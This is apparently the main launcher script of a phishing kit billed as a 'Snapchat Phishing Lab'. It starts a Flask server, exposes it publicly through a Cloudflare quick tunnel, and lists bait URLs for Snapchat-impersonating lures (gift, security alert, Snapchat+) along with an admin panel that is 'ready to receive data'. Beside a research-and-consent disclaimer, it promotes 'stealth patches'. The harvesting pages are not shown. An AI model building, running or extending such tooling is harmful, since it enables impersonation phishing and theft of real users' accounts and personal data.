import os
import sys
import subprocess
import re
import time
from app import app, create_app
from app.config import CONFIG, BASE_DIR
from app.database import init_database
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text

console = Console()

def get_cloudflare_url():
    """ Tente d'extraire l'URL du tunnel Cloudflare depuis les logs. """
    try:
        # On lance cloudflared en arrière-plan si pas déjà lancé
        process = subprocess.Popen(
            [os.path.join(BASE_DIR, "cloudflared.exe"), "tunnel", "--url", f"http://localhost:{CONFIG['SERVER_PORT']}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        
        # On lit le flux pour trouver l'URL trycloudflare.com
        for line in process.stdout:
            if "trycloudflare.com" in line:
                match = re.search(r"https://[a-zA-Z0-9-.]+.trycloudflare.com", line)
                if match:
                    return match.group(0), process
    except Exception as e:
        console.print(f"[red]Error launching Cloudflared: {e}[/red]")
    return None, None

def show_help():
    table = Table(title=" Available Commands ", show_header=True, header_style="bold cyan", border_style="magenta")
    table.add_column("Command", style="green")
    table.add_column("Description")
    
    table.add_row("start", "🚀 Launches the lab with automatic Cloudflare Tunneling")
    table.add_row("update", "🔄 Updates the project from GitHub and installs dependencies")
    table.add_row("help", "❓ Shows this help menu")
    table.add_row("info", "ℹ️ Displays project info and research guidelines")
    table.add_row("exit", "❌ Shuts down the orchestrator")
    
    console.print("\n")
    console.print(table)
    console.print("\n[bold white]Usage:[/bold white] [yellow]python main.py <command>[/yellow]\n")

def show_info():
    info_text = Panel(
        "[bold cyan]Snapchat Phishing Lab - Purple Team Edition[/bold cyan]\n\n"
        "[white]This environment is designed for ethical research. Every single link generated\n"
        "is tracked and logged. Use it to study human behavior toward phishing attacks.[/white]\n\n"
        "[bold yellow]Guidelines:[/bold yellow]\n"
        "1. Always use a sandbox VM.\n"
        "2. Consent from participants is mandatory.\n"
        "3. Use 'python main.py update' before every session to ensure you have the latest stealth patches.\n\n"
        "[bold red]WARNING: Misuse of this tool for illegal activities is strictly prohibited.[/bold red]",
        title="Project Info", border_style="magenta"
    )
    console.print(info_text)

def run_update():
    console.print("[yellow][*] Initializing Update Sequence...[/yellow]")
    try:
        subprocess.run(["git", "pull"], check=True)
        console.print("[yellow][*] Synchronizing dependencies...[/yellow]")
        pip_path = os.path.join(BASE_DIR, "venv", "Scripts", "pip") if os.name == 'nt' else os.path.join(BASE_DIR, "venv", "bin", "pip")
        subprocess.run([pip_path, "install", "-r", "requirements.txt"], check=True)
        console.print("[green]✔ Project successfully updated to the latest version![/green]")
    except Exception as e:
        console.print(f"[red]✘ Update failed: {e}[/red]")

def start_mission_control():
    """ Main loop that handles Server + Tunnel + Link Generation. """
    init_database()
    
    # 1. Launch Server in background (conceptually) or just start it
    # Since Flask app.run blocks, we do the prep before starting the server
    
    console.print(Panel("[bold magenta]SNG MISSION CONTROL - Initializing...[/bold magenta]", border_style="blue"))
    
    # 2. Cloudflare Logic
    console.print("[yellow][*] Establishing Cloudflare Tunnel...[/yellow]")
    cf_url, cf_process = get_cloudflare_url()
    
    if cf_url:
        console.print(f"[green]✔ Tunnel established: {cf_url}[/green]")
        
        # 3. Link Generation Matrix (THE LOGIC PART)
        # Imagine all possible baits
        baits = {
            "Main Bait (Classement)": "/",
            "Scenario Cadeau": "/scenario/cadeau",
            "Scenario Sécurité": "/scenario/securite",
            "Scenario Snapchat+": "/scenario/snapchat_plus",
            "Admin Panel": "/admin"
        }
        
        matrix = Table(title="🎯 Active Bait Links", show_header=True, header_style="bold magenta", border_style="blue")
        matrix.add_column("Target Scenario", style="cyan")
        matrix.add_column("Live URL", style="green")
        
        for name, path in baits.items():
            full_url = f"{cf_url}{path}"
            matrix.add_row(name, full_url)
            
        console.print("\n")
        console.print(matrix)
        console.print("\n")
    else:
        console.print("[red]✘ Tunnel failed. Running in LOCAL MODE only.[/red]")
        console.print(f"[white]Local URL: http://localhost:{CONFIG['SERVER_PORT']}[/white]")

    console.print(Panel(f"[bold cyan]Admin Key:[/bold cyan] {CONFIG['ADMIN_KEY']}\n[bold cyan]Status:[/bold cyan] READY TO RECEIVE DATA", border_style="green"))

    try:
        app.run(host='0.0.0.0', port=CONFIG["SERVER_PORT"],
                ssl_context='adhoc' if CONFIG["USE_HTTPS"] else None,
                threaded=True)
    finally:
        if cf_process:
            cf_process.terminate()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower()
        if cmd == 'help':
            show_help()
        elif cmd == 'info':
            show_info()
        elif cmd == 'update':
            run_update()
        elif cmd == 'start':
            start_mission_control()
        else:
            console.print(f"[red]Unknown command: {cmd}. Type 'python main.py help' for info.[/red]")
            sys.exit(1)
    else:
        show_help()
        sys.exit(0)
